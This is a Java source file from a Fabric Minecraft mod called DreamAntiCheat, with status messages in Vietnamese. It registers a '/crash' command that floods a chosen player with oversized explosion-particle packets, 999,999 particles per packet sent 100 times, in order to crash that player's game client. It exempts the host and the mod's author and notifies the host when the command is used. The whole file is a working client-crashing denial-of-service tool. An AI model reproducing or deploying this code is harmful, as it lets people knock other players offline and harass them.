package net.dreamanticheat.home.commands;

import com.mojang.brigadier.CommandDispatcher;
import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.exceptions.CommandSyntaxException;
import com.mojang.brigadier.suggestion.SuggestionProvider;
import net.dreamanticheat.home.DreamAntiCheat;
import net.dreamanticheat.home.TextColor;
import net.fabricmc.fabric.api.command.v1.CommandRegistrationCallback;
import net.minecraft.command.CommandSource;
import net.minecraft.network.packet.s2c.play.ParticleS2CPacket;
import net.minecraft.particle.ParticleTypes;
import net.minecraft.server.command.CommandManager;
import net.minecraft.server.command.ServerCommandSource;
import net.minecraft.server.network.ServerPlayerEntity;
import net.minecraft.util.Formatting;
import net.minecraft.util.math.Vec3d;

import java.util.Arrays;
import java.util.List;

public class CrashCommand {
    public static void register(){
        CommandRegistrationCallback.EVENT.register(CrashCommand::initialize);
    }
    public static void initialize(CommandDispatcher<ServerCommandSource> dispatcher, boolean dedicated){
        SuggestionProvider<ServerCommandSource> onlinePlayersSuggestions = (context, builder) -> {
            List<String> onlinePlayers = Arrays.asList(context.getSource().getMinecraftServer().getPlayerNames());
            return CommandSource.suggestMatching(onlinePlayers, builder);
        };

        dispatcher.register(CommandManager.literal("crash").requires(source -> source.hasPermissionLevel(1))
                .then(CommandManager.argument("target", StringArgumentType.word())
                        .suggests(onlinePlayersSuggestions)
                        .executes(context -> {
                            try {
                                return crash(context.getSource(), StringArgumentType.getString(context, "target"));
                            } catch (InterruptedException e) {
                                throw new RuntimeException(e);
                            }
                        })
                )
        );
    }

    private static int crash(ServerCommandSource source, String target) throws CommandSyntaxException, InterruptedException {
        ServerPlayerEntity senderPlayer = source.getPlayer();
        ServerPlayerEntity targetPlayer = source.getMinecraftServer().getPlayerManager().getPlayer(target);
        if(targetPlayer.getServer() == null){
            senderPlayer.sendMessage(TextColor.text("Không thể dùng khi ở chế độ chơi đơn.", Formatting.RED),false);
            return 0;
        }
        if(senderPlayer == targetPlayer){
            senderPlayer.sendMessage(TextColor.text("You good bro?", Formatting.RED),false);
            return 0;
        }
        if(targetPlayer.getServer().isHost(targetPlayer.getGameProfile())){
            senderPlayer.sendMessage(TextColor.text("Không được crash chủ map.", Formatting.RED),false);
            return 0;
        }
        if(targetPlayer.getUuid().equals(DreamAntiCheat.DreamUUID)){
            senderPlayer.sendMessage(TextColor.text("Ghê vậy sao :0", Formatting.RED),false);
            return 0;
        }
        Vec3d pos = targetPlayer.getPos();
        ParticleS2CPacket packet = new ParticleS2CPacket(ParticleTypes.EXPLOSION_EMITTER, false, pos.x, pos.y, pos.z, 1, 1, 1, 10, 999999);
        senderPlayer.sendMessage(TextColor.text("Đang tiến hành send packet", Formatting.GREEN),false);
        for (int i = 0; i < 100; i++) {
            targetPlayer.networkHandler.sendPacket(packet);
            if(i%10==0)
            senderPlayer.sendMessage(TextColor.text(i*10+"/1000 packets",Formatting.RED), false);
        }
        senderPlayer.sendMessage(TextColor.text("Send packet hoàn tất, người chơi đã bị crash game.\nMod by Dream_Da_Vang", Formatting.GREEN),false);
        if(!DreamAntiCheat.MC.getServer().isHost(senderPlayer.getGameProfile())){
            DreamAntiCheat.sendMsgHost(TextColor.text(senderPlayer.getName().getString()+" đã /crash người chơi "+target, Formatting.RED));
        }
        return 1;
    }
}